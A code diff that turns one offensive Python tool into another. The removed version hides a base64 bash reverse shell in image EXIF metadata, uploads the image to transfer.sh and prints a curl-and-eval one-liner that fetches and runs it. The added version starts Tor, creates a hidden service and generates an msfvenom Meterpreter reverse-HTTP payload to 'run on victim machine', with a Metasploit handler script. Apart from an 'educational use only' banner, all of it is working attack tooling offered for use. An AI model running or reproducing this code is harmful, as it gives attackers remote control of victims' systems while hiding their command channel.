@@ -1,148 +1,141 @@
 # -*- coding: utf-8 -*-
 # Author: calfcrusher@inventati.org
-from __future__ import absolute_import
 
-import random
-import string
 import os
-import nclib
-import lib.Cuteit as Cit
+import shutil
+import signal
+import subprocess
+import time
 
-from PIL import Image
+from stem.control import Controller
 from termcolor import colored
-from pyfiglet import Figlet
+from subprocess import check_output
 
 
-def listener():
-    """Open a netcat listener"""
+def generatebatch():
+    """Generate metasploit batch .rc file"""
 
+    with open('msfconsole.rc', 'w') as f:
+        f.write("use exploit/multi/handler\n")
+        f.write("set PAYLOAD python/meterpreter_reverse_http\n")
+        f.write("set LHOST 127.0.0.1\n")
+        f.write("set LPORT 5000\n")
+        f.write("exploit -jz\n")
+
+    print(" * msfconsole.rc batch file generated in " + os.getcwd())
     print('\n')
-    print(colored("Set up listener? (y/n)", 'red'))
-
     # Asking for valid response
     while True:
-        response = str(input("").strip('\n'))
+        response = input("[!] Start msfconsole now? [yes/no] ")
         if not response.isalpha():
             continue
-        if response == 'y' or response == 'n':
+        if response == 'yes' or response == 'no':
             break
 
-    if response == 'y':
+    if response == 'yes':
+        subprocess.Popen(['xterm', '-e', 'msfconsole -q -r msfconsole.rc'])
+
+
+def generatepayload(hostname):
+    """Generating msfvenom python nostaged payload"""
+
+    # Check if msfvenom is installed
+    rc = subprocess.call(['which', 'msfvenom'], stdout=subprocess.PIPE)
+    if rc:
         print('\n')
-        ip = input("Enter ADDRESS to listen on: ")
-        port = int(input("Enter PORT to listen on: "))
+        print('[!] Unable to find msfvenom! Exiting..')
+        exit(0)
+    print(" * Generating msfvenom python/meterpreter_reverse_http payload..")
+    print('\n')
+    # Append .ws Tor2Web extension
+    lhost = hostname + ".ws"
+    # Generate payload
+    payload = "msfvenom -p python/meterpreter_reverse_http LHOST=" + lhost + " LPORT=80 > payload.py"
+    subprocess.call(payload, stdout=subprocess.PIPE, shell=True)
+    print(" * payload.py generated in " + os.getcwd() + " - Run on victim machine")
+
+
+def stem():
+    """Start hidden service"""
+
+    # Check if tor is installed
+    rc = subprocess.call(['which', 'tor'], stdout=subprocess.PIPE)
+    if rc:
         print('\n')
-        # open socket listener with nclib
-        print(colored("[*] Listening on: " + str(ip) + ":" + str(port), 'red'))
-        nc = nclib.Netcat(listen=(ip, port))
-        nc.interact()
-        nc.close()
-        print('Bye!')
+        print('[!] Unable to find tor! Exiting..')
         exit(0)
     else:
-        return
+        # Start tor
+        print(' * Starting tor network..')
+        os.system("tor --quiet &")
 
+    # Give some time to start tor circuit..
+    time.sleep(6)
 
-def payload_generator(imageurl):
-    """Generate oneliner post exploitation command"""
+    with Controller.from_port() as controller:
+        controller.authenticate()
+        # Create a directory for hidden service
+        hidden_service_dir = os.path.join(controller.get_conf('DataDirectory', os.getcwd()), 'hidden_service_data')
 
-    print('\n')
-    print(colored("[1] -> Generate oneliner for OSX", 'red'))
-    print(colored("[2] -> Generate oneliner for LINUX", 'red'))
+        # Create a hidden service where visitors of port 80 get redirected to local
+        # port 5000
+        try:
+            print(" * Creating hidden service in %s" % hidden_service_dir)
+            result = controller.create_hidden_service(hidden_service_dir, 80, target_port=5000)
+        except:
+            print("[!] Unable to connect ! Is tor running? Exiting..")
+            exit(0)
 
-    # Asking for valid number
-    while True:
-        system = input("Type number: ")
-        if not system.isnumeric():
-            continue
-        if int(system) == 1 or int(system) == 2:
-            break
+        # The hostname is only available when we can read the hidden service
+        # directory. This requires us to be running with the same user as tor process.
+        if result.hostname:
+            print(" * Service is available at %s redirecting to local port 5000" % result.hostname)
+            # Generate payload
+            generatepayload(result.hostname)
+            # Generate metasploit batch file
+            generatebatch()
+            print('\n')
+        else:
+            print(
+                "* Unable to determine our service's hostname, probably due to being unable to read the hidden "
+                "service directory. Exiting..")
+            exit(0)
 
-    # Generate oneliner for OSX
-    if int(system) == 1:
-        osxpayload = "p=$(curl -s " + imageurl + " | grep Cert -a | sed 's/<[^>]*>//g' |base64 -d);eval $p"
-        print('\n')
-        print(colored("[*] OSX payload generated!", 'red'))
-        print(osxpayload)
-    # Generate oneliner for LINUX
-    elif int(system) == 2:
-        nixpayload = "p=$(curl -s " + imageurl + " | grep Cert -a | sed 's/<[^>]*>//g' |base64 -i -d);eval $p"
-        print('\n')
-        print(colored("[*] Linux payload generated!", 'red'))
-        print(nixpayload)
-
-
-def createpayload(ip, port):
-    """Create base64 payload"""
-
-    # Rewrite our ip in HEX (https://github.com/D4Vinci/Cuteit)
-    hexip = Cit.lib(ip)
-    base64payload = os.popen("printf 'bash -i >& /dev/tcp/" + str(hexip.hex) + "/" + port + " 0>&1' | base64 | tr -d "
-                                                                                            "'\n'").read()
-
-    return base64payload
-
-
-def insertpayload(payload, image):
-    """Add metadata with exiftool"""
-
-    os.system("exiftool -overwrite_original -Certificate='" + payload + "' " + image)
-
-
-def uploadimage(file):
-    """Upload image to transfer.sh free hosting service"""
-
-    url = os.popen("curl -s --upload-file ./" + file + " https://transfer.sh/" + file).read()
-    print('\n')
-    print(colored("[*] Image uploaded!", 'red'))
-    print(url)
-
-    return url
-
-
-def createimage():
-    """Create random image"""
-
-    charset = string.ascii_lowercase
-    filename = ''.join(random.choice(charset) for i in range(5)) + '.jpg'
-    width = 80
-    height = 80
-    img = Image.new('RGB', (width, height))
-    img.save(filename)
-
-    return filename
+        try:
+            input("\x1b[6;30;42mRUNNING - <enter> to quit\x1b[0m")
+        finally:
+            # Shut down the hidden service and clean it off disk. Note that you *don't*
+            # want to delete the hidden service directory if you'd like to have this
+            # same *.onion address in the future.
+            print(" * Shutting down hidden service and clean it off disk")
+            controller.remove_hidden_service(hidden_service_dir)
+            shutil.rmtree(hidden_service_dir)
+            print(" * Shutting down tor")
+            os.kill(int(check_output(["pidof", "tor"])), signal.SIGTERM)
 
 
 def main():
     """Main function of tool"""
 
-    f = Figlet(font='larry3d')
-    print(colored(f.renderText('ExifManiac'), 'green'), end='')
-    print(colored("\tcalfcrusher@inventati.org | For educational use only", 'green'))
+    print("""\033[91m
+
+
+            ██████╗░░█████╗░██╗░█████╗░███╗░░██╗░█████╗░
+            ██╔══██╗██╔══██╗██║██╔══██╗████╗░██║██╔══██╗
+            ██████╔╝██║░░██║██║███████║██╔██╗██║███████║
+            ██╔═══╝░██║░░██║██║██╔══██║██║╚████║██╔══██║
+            ██║░░░░░╚█████╔╝██║██║░░██║██║░╚███║██║░░██║
+            ╚═╝░░░░░░╚════╝░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
+    \x1b[0m""")
+
+    print(colored("\tMeterpreter Reverse shell on TOR using hidden services", 'red'))
+    print(colored("\tcalfcrusher@inventati.org | For educational use only", 'red'))
     print('\n')
 
-    # Ask for ip and port
-    print(colored("Generate Reverse Shell Payload", 'red'))
-    ip = input("Enter IP/HOST: ")
-    port = input("Enter PORT: ").strip('\n')
-
-    # Create image
-    filename = createimage()
-    # Create payload
-    payload = createpayload(ip, port)
-    # Insert payload in metadata tag (Certificate)
-    insertpayload(payload, filename)
-    # Upload image
-    urlimage = uploadimage(filename)
-    # Remove image on hard disk
-    os.system("rm " + filename)
-    # Generate and output payload
-    payload_generator(urlimage)
-    # Open nc listener
-    listener()
+    time.sleep(2)
+    stem()
 
 
 if __name__ == "__main__":
     os.system('clear')
     main()
-    print('Bye!')
